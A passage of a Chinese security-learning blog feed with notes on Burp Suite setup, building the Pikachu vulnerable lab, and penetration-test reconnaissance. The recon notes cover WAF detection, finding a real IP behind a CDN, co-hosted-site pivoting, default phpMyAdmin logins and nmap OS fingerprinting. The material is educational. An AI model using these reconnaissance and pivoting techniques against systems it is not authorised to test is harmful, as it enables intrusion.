title="浏览器配置"></a>浏览器配置</h1><ul><li>这里我选择的是火狐浏览器firefox<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904212717.png" alt="image.png"></li><li>按照这个内容设置</li><li>其他浏览器的方法可以在网上找找，都差不多</li></ul><h1 id="CA证书"><a href="#CA证书" class="headerlink" title="CA证书"></a>CA证书</h1><ul><li>使用Burp Suite做安全测试时，要抓取HTTPS的包的话，是需要有Burp Suite的CA证书的，否则浏览器不支持。</li><li>使用BP导出CA证书<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904212913.png" alt="image.png"></li><li>输入以下内容就可以<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904212947.png" alt="image.png"></li><li>在burpsuite同级目录下就会出现证书文件<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904213029.png" alt="image.png"></li><li>打开火狐浏览器，设置内搜索<code>证书</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904213118.png" alt="image.png"></li><li>点击<code>导入...</code>，选择刚刚导出的证书即可<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230904213303.png" alt="image.png"></li><li>这样就算安装完成了</li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具 </tag>
            
            <tag> burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pikachu靶场环境搭建</title>
      <link href="/2023/09/03/Pikachu%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2023/09/03/Pikachu%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<ul><li>Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。 如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，那么Pikachu可能正合你意。</li></ul><h1 id="第一步安装phpstudy"><a href="#第一步安装phpstudy" class="headerlink" title="第一步安装phpstudy"></a>第一步安装phpstudy</h1><ul><li>在<a href="https://www.xp.cn/download.html">phpstudy官网</a>下载安装<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230903215830.png" alt="image.png"></li><li>这里只需要使用到Mysql和apache，所以打开这两个就可以了。</li><li>如果出现MySQL无法打开的情况，可以试试改变MySQL的连接端口，可能是电脑已存在MySQL并占用了默认的3306端口</li><li>测试一下是否开启成功，在浏览器打开<code>localhost/index.php</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230903222109.png" alt="image.png"></li><li>出现以上页面则启动成功</li></ul><h1 id="第二步下载pikachu"><a href="#第二步下载pikachu" class="headerlink" title="第二步下载pikachu"></a>第二步下载pikachu</h1><ul><li>在GitHub当中下载<a href="https://github.com/zhuifengshaonianhanlu/pikachu">pikachu</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230903220438.png" alt="image.png"></li></ul><h1 id="第三步搭建pikachu"><a href="#第三步搭建pikachu" class="headerlink" title="第三步搭建pikachu"></a>第三步搭建pikachu</h1><ul><li>在phpstudy中，左栏选择网站</li><li>在网站中创建一个127.0.0.1的网站</li><li>然后将下载的<code>pikachu.zip</code>压缩包解压到<code>phpstudy_pro/WWW/127.0.0.1</code>下</li><li>然后打开<code>pikachu-master/inc/conf.inc.php</code>文件<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230903220851.png" alt="image.png"></li><li>按照指示修改内容</li></ul><h1 id="第四步pikachu！启动！"><a href="#第四步pikachu！启动！" class="headerlink" title="第四步pikachu！启动！"></a>第四步pikachu！启动！</h1><ul><li>在浏览器打开<code>127.0.0.1/pikachu-master</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230903221106.png" alt="image.png"></li><li>可以看见pikachu已经成功打开了，但是还需要初始化</li><li>浏览器地址加上<code>/install.php</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230903221252.png" alt="image.png"></li><li>点击<code>安装/初始化</code>就可以了</li></ul><h1 id="补充-我遇到的问题"><a href="#补充-我遇到的问题" class="headerlink" title="补充-我遇到的问题"></a>补充-我遇到的问题</h1><ol><li>一开始我将<code>pikachu-master</code>直接放在了WWW下，导致一直打不开页面，记得是放在<code>127.0.0.1</code>下</li><li>之后就是网站可以打开了，但是使用里面的内容会出现<code>数据连接失败，请仔细检查inc/config.inc.php的配置解决方法</code>，只是因为没有初始化就直接开始使用的情况，当时搞了好久才发现问题。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具 </tag>
            
            <tag> pikachu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day08信息收集-架构，搭建，WAF等</title>
      <link href="/2023/09/02/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day08%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%B6%E6%9E%84%EF%BC%8C%E6%90%AD%E5%BB%BA%EF%BC%8CWAF%E7%AD%89/"/>
      <url>/2023/09/02/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day08%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%B6%E6%9E%84%EF%BC%8C%E6%90%AD%E5%BB%BA%EF%BC%8CWAF%E7%AD%89/</url>
      
        <content type="html"><![CDATA[<ul><li>在安全测试中，信息收集是非常重要的一个环节，此环节的信息将影响到后续的成功几率，掌握信息的多少将决定发现漏洞机会大小，换言之决定着是否能完成目标的测试任务。也可以很直接的跟大家说:渗透测试的思路就是从信息收集这里开始，你与大牛的差距也是从这里开始的!<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.png"></li></ul><h1 id="站点搭建分析"><a href="#站点搭建分析" class="headerlink" title="站点搭建分析"></a>站点搭建分析</h1><h2 id="搭建习惯-目录型站点"><a href="#搭建习惯-目录型站点" class="headerlink" title="搭建习惯-目录型站点"></a>搭建习惯-目录型站点</h2><ul><li>简单的理解就是主站上面存在其他的cms程序</li><li>例如：</li><li>学生网站的上面通过后台扫描探针发现有一个bbs的目录一点击发现是一个bbs的论坛网站如：<code>www.xxx.com/bbs</code></li><li>我们把这个成为目录型网站、可以有两种找到漏洞的思路一个是主站的漏洞另外的一个是bbs上面的漏洞</li></ul><h2 id="搭建习惯-端口类站点"><a href="#搭建习惯-端口类站点" class="headerlink" title="搭建习惯-端口类站点"></a>搭建习惯-端口类站点</h2><ul><li>有的站点不是使用的是默认的站点80而是其他的端口，可以使用shodan这种工具去收集端口</li></ul><h2 id="搭建习惯-子域名站点"><a href="#搭建习惯-子域名站点" class="headerlink" title="搭建习惯-子域名站点"></a>搭建习惯-子域名站点</h2><ul><li>现在的主流网站都是采用的这种模式且子域名和网站之间很有可能是不在同一台的服务器上面。</li></ul><h2 id="搭建习惯-类似域名站点"><a href="#搭建习惯-类似域名站点" class="headerlink" title="搭建习惯-类似域名站点"></a>搭建习惯-类似域名站点</h2><ul><li>有些公司由于业务的发展将原来的域名弃用、选择了其他的域名但是我们访问他的旧的域名还是能够访问、有的是二级域名的更换而有的是顶级域名的更换</li><li>可以通过他的旧的域名找到一些突破口</li><li>例如：京东的网站是jd.com 那么他就有可能是采用了jd.net jd.cn等域名我们采用社工的方式去尝试获取他的相关域名信息</li></ul><h2 id="搭建习惯-旁注-c段站点"><a href="#搭建习惯-旁注-c段站点" class="headerlink" title="搭建习惯-旁注,c段站点"></a>搭建习惯-旁注,c段站点</h2><ul><li>旁注：同一个服务器上面存在多个站点、但是你要攻击的是A网站由于各种原因不能完成安全测试。就通过测试B网站进入服务器然后在攻击A网站最终实现目的。</li><li>C段：不同的服务器上面存在不同的网站，通过扫描发现与你渗透测试的是同一个网段最终拿下服务器、然后通过内网渗透的方式拿下渗透服务器。</li><li>在线工具：<a href="https://www.webscan.cc/">https://www.webscan.cc/</a></li><li>通过旁注查询可以发现同一个服务器上面有两个站点可以通过对另外的一个站点进行突破。</li></ul><h2 id="搭建习惯-搭建软件特征站点"><a href="#搭建习惯-搭建软件特征站点" class="headerlink" title="搭建习惯-搭建软件特征站点"></a>搭建习惯-搭建软件特征站点</h2><ul><li>有的网站是借助于第三方的集成搭建工具实现例如：PHPstudy、宝塔等环境</li><li>这样的集成环境搭建的危害就是泄露了详细的版本信息。</li><li>phpstudy搭建了之后在默认的站点安装了phpmyadmin有的网站没有做安全性直接可以通过用户名：root密码：root 登录进入</li></ul><h1 id="WAF防护分析"><a href="#WAF防护分析" class="headerlink" title="WAF防护分析"></a>WAF防护分析</h1><h2 id="什么是WAF应用"><a href="#什么是WAF应用" class="headerlink" title="什么是WAF应用"></a>什么是WAF应用</h2><ul><li>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。</li></ul><h2 id="如何快速识别WAF"><a href="#如何快速识别WAF" class="headerlink" title="如何快速识别WAF"></a>如何快速识别WAF</h2><h3 id="采用工具wafwoof"><a href="#采用工具wafwoof" class="headerlink" title="采用工具wafwoof"></a>采用工具wafwoof</h3><ul><li>获取地址：<a href="https://codeload.github.com/EnableSecurity/wafw00f/zip/refs/heads/master">https://codeload.github.com/EnableSecurity/wafw00f/zip/refs/heads/master</a></li><li>安装之前一定要有python的环境不然安装不上<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20221934.png"></li><li>wafw00f的缺点判断的不是特别的准确存在误报或识别不出的情况。</li></ul><h3 id="检查元素"><a href="#检查元素" class="headerlink" title="检查元素"></a>检查元素</h3><ul><li>在有些网站的请求信息当中有的网站没有做安全信息上面留下了waf的相关信息<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/waf%E6%B5%8B%E8%AF%95.png"></li></ul><h3 id="使用nmap指纹检测"><a href="#使用nmap指纹检测" class="headerlink" title="使用nmap指纹检测"></a>使用nmap指纹检测</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --script==http-waf-fingerprint</span><br><span class="line">nmap --script=http-waf-detec</span><br></pre></td></tr></table></figure><h2 id="识别wAF对于安全测试的意义"><a href="#识别wAF对于安全测试的意义" class="headerlink" title="识别wAF对于安全测试的意义"></a>识别wAF对于安全测试的意义</h2><ul><li>对于一个网站要是使用了waf而渗透人员没有识别直接使用工具进行扫描有可能会导致waf将你的ip地址拉入黑名单而不能访问。而识别waf在于有针对性行的绕过各个厂商的waf可能存在着不同的绕过思路。</li></ul><hr><p>笔记参考自<a href="https://www.yuque.com/weiker/xiaodi">小迪安全</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day07信息收集-CDN绕过方法</title>
      <link href="/2023/09/02/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day07%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-CDN%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/"/>
      <url>/2023/09/02/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day07%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-CDN%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<ul><li>CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在CDN服务，将会影响到后续的安全测试过程。 <img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/CDN.png"></li></ul><h1 id="如何判断目标存在CDN服务"><a href="#如何判断目标存在CDN服务" class="headerlink" title="如何判断目标存在CDN服务"></a>如何判断目标存在CDN服务</h1><ul><li>利用多节点技术进行请求返回判断</li><li><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20104946.png"></li><li>如果ping的结果只有一个那么就没有CDN、要是不止一个则可以判断为有CDN</li><li>没有使用CDN，例如<a href="http://www.xiaodi8.com/">www.xiaodi8.com</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20105039.png"></li><li>使用了CDN，例如<a href="http://www.baidu.com/">www.baidu.com</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20105112.png"></li></ul><h1 id="CDN对于安全测试有那些影响"><a href="#CDN对于安全测试有那些影响" class="headerlink" title="CDN对于安全测试有那些影响"></a>CDN对于安全测试有那些影响</h1><ul><li>cdn会隐藏服务器真实的ip地址，无法对目标网站的操作系统进行渗透，但cdn站点又可以理解为是目标站点的镜像站点（大多数都是静态cdn加速），拥有相同的网站架构，且cdn服务器可与站点服务器进行交互，因此sql注入，xss等漏洞的挖掘并不受太大影响。</li></ul><h1 id="目前常见的CDN绕过技术有哪些"><a href="#目前常见的CDN绕过技术有哪些" class="headerlink" title="目前常见的CDN绕过技术有哪些"></a>目前常见的CDN绕过技术有哪些</h1><h2 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h2><ul><li>因为有些网站为了节约成本，只为主站做了CDN服务，而子站没有，所以可以通过子站查询到IP地址</li></ul><h2 id="邮箱服务查询"><a href="#邮箱服务查询" class="headerlink" title="邮箱服务查询"></a>邮箱服务查询</h2><ul><li>很多公司都有内部邮箱，大部分都是内部人员访问，而且访问量不大，所以基本上都没有做CDN服务</li></ul><h2 id="国外地址请求"><a href="#国外地址请求" class="headerlink" title="国外地址请求"></a>国外地址请求</h2><ul><li>因为很多的企业没有在国外部署CDN，要是用国外的地址请求、就容易找到他的真实地址。</li></ul><h2 id="遗留文件"><a href="#遗留文件" class="headerlink" title="遗留文件"></a>遗留文件</h2><ul><li>如PHPinfo信息当中会遗留出ip地址</li></ul><h2 id="扫描全网"><a href="#扫描全网" class="headerlink" title="扫描全网"></a>扫描全网</h2><ul><li>从各个地区进行扫描IP，一般距离服务器近的不会使用CDN，即是真实IP</li></ul><h2 id="黑暗引擎搜索"><a href="#黑暗引擎搜索" class="headerlink" title="黑暗引擎搜索"></a>黑暗引擎搜索</h2><ul><li>fofa、傻蛋（shodan）、谛听、zoomeye、censys</li></ul><h2 id="特定文件dns历史记录"><a href="#特定文件dns历史记录" class="headerlink" title="特定文件dns历史记录"></a>特定文件dns历史记录</h2><ul><li>查看它没有使用CDN之前的IP地址记录，可能就是它的IP地址</li></ul><h2 id="以量打量"><a href="#以量打量" class="headerlink" title="以量打量"></a>以量打量</h2><ul><li>CDN节点的流量是有上限的，利用DDoS流量耗尽攻击，将流量耗尽就能直通原IP了</li><li>属于违法行为</li></ul><hr><p>笔记参考自<a href="https://www.yuque.com/weiker/xiaodi">小迪安全</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day06基础入门-加密算法</title>
      <link href="/2023/09/02/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day06%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
      <url>/2023/09/02/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day06%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<ul><li>在渗透测试中，常见的密码等敏感信息会采用加密处理，其中作为安全测试人员必须要了解常见的加密方式，才能为后续的安全测试做好准备，本次课程将讲解各种加密编码等知识，便于后期的学习和发展。</li></ul><h1 id="加密解密"><a href="#加密解密" class="headerlink" title="加密解密"></a>加密解密</h1><h2 id="加密软件"><a href="#加密软件" class="headerlink" title="加密软件"></a>加密软件</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20100158.png"></p><ul><li>解密网站<br><a href="https://www.cmd5.com/">https://www.cmd5.com/</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20100323.png"></li></ul><h2 id="常见加密编码等算法解析"><a href="#常见加密编码等算法解析" class="headerlink" title="常见加密编码等算法解析"></a>常见加密编码等算法解析</h2><ul><li>MD5，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES等</li><li>MD5等不可逆，这个网站不是通过常规枚举，而是通过已知</li></ul><h2 id="常见加密形式算法解析"><a href="#常见加密形式算法解析" class="headerlink" title="常见加密形式算法解析"></a>常见加密形式算法解析</h2><ul><li>直接加密，带salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</li></ul><h2 id="常见解密方式（针对"><a href="#常见解密方式（针对" class="headerlink" title="常见解密方式（针对)"></a>常见解密方式（针对)</h2><ul><li>枚举，自定义逆向算法，可逆向</li></ul><h2 id="了解常规加密算法的特性"><a href="#了解常规加密算法的特性" class="headerlink" title="了解常规加密算法的特性"></a>了解常规加密算法的特性</h2><ul><li>长度位数，字符规律，代码分析，搜索获取等</li></ul><h1 id="时间戳"><a href="#时间戳" class="headerlink" title="时间戳"></a>时间戳</h1><ul><li>时间戳网站&lt;<a href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a>&gt;<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20101017.png"></li><li>时间戳通常是用在用户的注册、登录、注销等情况</li></ul><h1 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h1><ul><li>url编码规则&lt;<a href="https://www.cnblogs.com/cxygg/p/9278542.html">https://www.cnblogs.com/cxygg/p/9278542.html</a>&gt;<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20101811.png"></li></ul><h1 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h1><ul><li>base64编码的特点：随着编码的文本增加而增加、由大小写和数字组成且字符结尾一般有两个等号</li><li>一般在代码中为了安全会使用base64进行编码<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20102002.png"></li></ul><h1 id="unescape编码"><a href="#unescape编码" class="headerlink" title="unescape编码"></a>unescape编码</h1><ul><li>和URL编码有点像</li><li>特点：一般是%U+四个数字对应着两个字符、主要运用于网站web应用<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20102141.png"></li></ul><h1 id="AES加密"><a href="#AES加密" class="headerlink" title="AES加密"></a>AES加密</h1><ul><li>AES在逐渐的取代md5值、在解密的过程中一定要知道密码和偏移量不然是借不出来的。</li><li>在线工具：<a href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-02%20102645.png"></li><li>密码是干扰项，会加入到文本当中，偏移量是加密的起始点</li><li>看起来是base64，但是对base64解密得到的是乱码</li></ul><hr><p>笔记参考自<a href="https://www.yuque.com/weiker/xiaodi">小迪安全</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day05基础入门-系统及数据库等</title>
      <link href="/2023/09/01/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day05%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/"/>
      <url>/2023/09/01/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day05%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AD%89/</url>
      
        <content type="html"><![CDATA[<p>除去前期讲到过的搭建平台中间件，网站源码外，容易受到攻击的还有操作系统，数据库，第三方平台等，期中这类攻击也能直接影响到WEB或服务器的安全，导致网站或服务器权限的获取。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93.png"></p><h1 id="操作系统层面："><a href="#操作系统层面：" class="headerlink" title="操作系统层面："></a>操作系统层面：</h1><h2 id="识别操作系统的常见方法"><a href="#识别操作系统的常见方法" class="headerlink" title="识别操作系统的常见方法"></a>识别操作系统的常见方法</h2><h3 id="有网站"><a href="#有网站" class="headerlink" title="有网站"></a>有网站</h3><ul><li>可以通过网站的手工识别方法判断：</li><li>windows对大小写不敏感，也就是说你在网页中可以替换网站路径的大小写进行测试，如果改变大小写不会影响则可能是Windows的服务器，有影响则可能是Linux。</li></ul><h3 id="没网站"><a href="#没网站" class="headerlink" title="没网站"></a>没网站</h3><ul><li>通过nmap进行扫描：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O IP地址</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-01%20141011.png"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Running (JUST GUESSING): Microsoft Windows 7|2008|Vista|8.1|2012 (96%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1:r1 cpe:/o:microsoft:windows_server_2012:r2</span><br><span class="line">Aggressive OS guesses: Microsoft Windows 7 SP1 (96%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 or 2008 Beta 3 (90%), Microsoft Windows 7 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (90%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (90%), Microsoft Windows Server 2008 (90%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%)</span><br></pre></td></tr></table></figure></li><li>对服务器系统进行了识别，这个判断应该为<code>Microsoft Windows 7 SP1</code></li><li>备注：不是所有的系统都可以用这种方式扫描出操作系统的类型、在windows的一些高版本中无法探测，例如：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">─<span class="comment"># nmap -O 10.1.1.129</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-07 21:10 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.1.1.129 (10.1.1.129)</span><br><span class="line">Host is up (0.00053s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">MAC Address: 00:0C:29:DC:AF:EA (VMware)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.91%E=4%D=6/7%OT=80%CT=1%CU=36041%PV=Y%DS=1%DC=D%G=Y%M=000C29%TM</span><br><span class="line">OS:=60BE1ADE%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=I%CI=I%II=I%</span><br><span class="line">OS:SS=S%TS=U)OPS(O1=M5B4NW8NNS%O2=M5B4NW8NNS%O3=M5B4NW8%O4=M5B4NW8NNS%O5=M5</span><br><span class="line">OS:B4NW8NNS%O6=M5B4NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)</span><br><span class="line">OS:ECN(R=Y%DF=Y%T=80%W=FFFF%O=M5B4NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%</span><br><span class="line">OS:F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=</span><br><span class="line">OS:80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%</span><br><span class="line">OS:Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=</span><br><span class="line">OS:A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=</span><br><span class="line">OS:Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%</span><br><span class="line">OS:T=80%CD=Z)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h3 id="TTL"><a href="#TTL" class="headerlink" title="TTL"></a>TTL</h3><p>不同的操作系统的默认TTL值是不同的， 所以我们可以通过TTL值来判断主机的操作系统，但是当用户修改了TTL值的时候，就会误导我们的判断，所以这种判断方式也<strong>不一定准确</strong>。下面是默认操作系统的TTL：</p><ol><li>WINDOWS NT&#x2F;2000   TTL：128</li><li>WINDOWS 95&#x2F;98     TTL：32</li><li>UNIX              TTL：255</li><li>LINUX             TTL：64</li><li>WIN7           TTL：64<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-01%20143750.png"></li></ol><ul><li>这个TTL&#x3D;110，接近与128，属于Windows NT&#x2F;2000</li></ul><h2 id="简要两者的区别及识别意义"><a href="#简要两者的区别及识别意义" class="headerlink" title="简要两者的区别及识别意义"></a>简要两者的区别及识别意义</h2><ul><li>系统文件的路径不同，Windows是分C盘、D盘等，而Linux的盘储存就不一样，等等。</li><li>已知服务器的操作系统是什么，就可以对症下药有针对性地围绕这个操作系统所支持地方面去发展。</li></ul><h2 id="操作系统层面漏洞类型对应意义"><a href="#操作系统层面漏洞类型对应意义" class="headerlink" title="操作系统层面漏洞类型对应意义"></a>操作系统层面漏洞类型对应意义</h2><ul><li>有些漏洞对于我们来说是没有意义的，只是会造成一些危害，但不会造成权限的丢失，只是影响了产品，没有获取到权限那就没太大意义。</li><li>不同的漏洞会造成不同漏洞利用的条件</li></ul><h2 id="简要操作系统层面漏洞影响范围"><a href="#简要操作系统层面漏洞影响范围" class="headerlink" title="简要操作系统层面漏洞影响范围"></a>简要操作系统层面漏洞影响范围</h2><ul><li>有些漏洞会对操作系统干扰造成崩溃、而有些系统只是蓝屏、或者是权限的提升</li></ul><h1 id="数据库层面："><a href="#数据库层面：" class="headerlink" title="数据库层面："></a>数据库层面：</h1><ul><li>网站分动态网站和静态网站，静态网站由于只是单页，没有数据传递，所以不存在数据库漏洞。</li></ul><h2 id="识别数据库类型常见方法"><a href="#识别数据库类型常见方法" class="headerlink" title="识别数据库类型常见方法"></a>识别数据库类型常见方法</h2><ul><li>默认的语言搭配的数据库<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 组合类型asp + 